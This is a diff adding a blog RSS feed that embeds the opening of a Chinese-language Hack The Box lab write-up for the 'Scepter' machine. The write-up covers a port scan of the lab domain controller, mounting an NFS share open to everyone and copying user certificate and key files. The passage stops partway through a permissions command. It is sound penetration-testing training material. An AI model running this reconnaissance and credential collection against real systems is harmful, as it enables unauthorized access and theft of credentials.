@@ -1,0 +1,752 @@
+<?xml version="1.0" encoding="utf-8" standalone="yes"?>
+<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
+    <channel>
+        <title>Domain on wackymaker</title>
+        <link>http://localhost:1313/tags/domain/</link>
+        <description>Recent content in Domain on wackymaker</description>
+        <generator>Hugo -- gohugo.io</generator>
+        <language>en-us</language>
+        <lastBuildDate>Mon, 01 Sep 2025 20:56:42 +0800</lastBuildDate><atom:link href="http://localhost:1313/tags/domain/index.xml" rel="self" type="application/rss+xml" /><item>
+        <title>scepter-wp</title>
+        <link>http://localhost:1313/post/scepter/</link>
+        <pubDate>Mon, 01 Sep 2025 20:56:42 +0800</pubDate>
+        
+        <guid>http://localhost:1313/post/scepter/</guid>
+        <description>&lt;h2 id=&#34;靶机总结&#34;&gt;靶机总结
+&lt;/h2&gt;&lt;p&gt;使用了两次esc14，很有意思，本文技术补充以添加至血缇之书&lt;/p&gt;
+&lt;p&gt;配置如下&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat start.sh 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ip&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;10.129.103.0
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;FQDN&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;DC01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;domain&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat krb5.conf 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;libdefaults&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dns_lookup_kdc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; false
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    dns_lookup_realm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; false
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    default_realm &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SCEPTER.HTB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;realms&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    SCEPTER.HTB &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        kdc &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        admin_server &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; dc01.scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        default_domain &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; scepter.htb
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;domain_realm&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    .scepter.htb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SCEPTER.HTB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    scepter.htb &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; SCEPTER.HTB
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cat hostname 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;10.129.103.0     DC01.scepter.htb scepter.htb DC01
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;入口&#34;&gt;入口
+&lt;/h2&gt;&lt;p&gt;并未存在smb和rpc匿名，进行端口扫描&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ rustscan -a $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt;  &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;| &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |&lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__ &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_   _&lt;span style=&#34;color:#f92672&#34;&gt;}{&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;__  /  ___&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; / &lt;span style=&#34;color:#f92672&#34;&gt;{}&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;|  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;| |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;| .-. &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;{&lt;/span&gt;_&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; |.-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; | |  .-._&lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt;    &lt;span style=&#34;color:#f92672&#34;&gt;}&lt;/span&gt;/  /&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;\|&lt;/span&gt; |&lt;span style=&#34;color:#ae81ff&#34;&gt;\ &lt;/span&gt; |
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-----&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;  `----&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;---&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39; `-&amp;#39;&lt;/span&gt;  &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;`-&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;`&lt;/span&gt;-&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;The Modern Day Port Scanner.
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;________________________________________
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: http://discord.skerritt.blog         :
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;: https://github.com/RustScan/RustScan :
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; --------------------------------------
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;Nmap? More like slowmap.🐢
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[~] The config file is expected to be at &amp;#34;/home/wackymaker/.rustscan.toml&amp;#34;
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
+&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;[!] Your file limit is very small, which negatively impacts RustScan&amp;#39;&lt;/span&gt;s speed. Use the Docker image, or up the Ulimit with &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;--ulimit 5000&amp;#39;&lt;/span&gt;. 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:53
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:88
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:111
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:135
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:139
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:389
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:445
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:464
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:593
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:636
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:2049
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:3268
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:3269
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:5986
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:5985
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:9389
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:47001
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49664
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49667
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49665
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49666
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49671
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49688
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49693
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49689
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49692
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49706
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49720
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49736
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Open 10.129.103.0:49754
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt; Starting Script&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;s&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;开放nfs端口，查看是否存在未授权&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ showmount -e $ip
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Export list &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; 10.129.103.0:
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;/helpdesk &lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;everyone&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;挂载后，发现是4个用户的证书&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo mount -t nfs $ip:/helpdesk ./test
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ cd test/
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;-bash: cd: test/: Permission denied
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ su root
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Password: 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/wackymaker/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# cd test                         
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                                                                                                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/tmp/hackthebox/scepter/test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# dir
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;baker.crt  baker.key  clark.pfx  lewis.pfx  scott.pfx
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                        
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;抓取到本地，修正权限&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-zsh&#34; data-lang=&#34;zsh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/tmp/hackthebox/scepter/test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# cp * ../                                                                    
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                                                                                                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/…/tmp/hackthebox/scepter/test&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# cd ../ 
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;                                                                                                                                                     
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;root㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;/home/wackymaker/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─# su wackymaker                                                           
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; *
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;baker.crt&amp;#39;&lt;/span&gt;: Operation not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;baker.key&amp;#39;&lt;/span&gt;: Operation not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;clark.pfx&amp;#39;&lt;/span&gt;: Operation not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;lewis.pfx&amp;#39;&lt;/span&gt;: Operation not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;scott.pfx&amp;#39;&lt;/span&gt;: Operation not permitted
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;chmod: changing permissions of &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;test&amp;#39;&lt;/span&gt;: Permission denied
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;┌──&lt;span style=&#34;color:#f92672&#34;&gt;(&lt;/span&gt;wackymaker㉿kali&lt;span style=&#34;color:#f92672&#34;&gt;)&lt;/span&gt;-&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;~/tmp/hackthebox/scepter&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;└─$ sudo chmod &lt;span style=&#34;color:#ae81ff&#34;&gt;777&lt;/span&gt; *
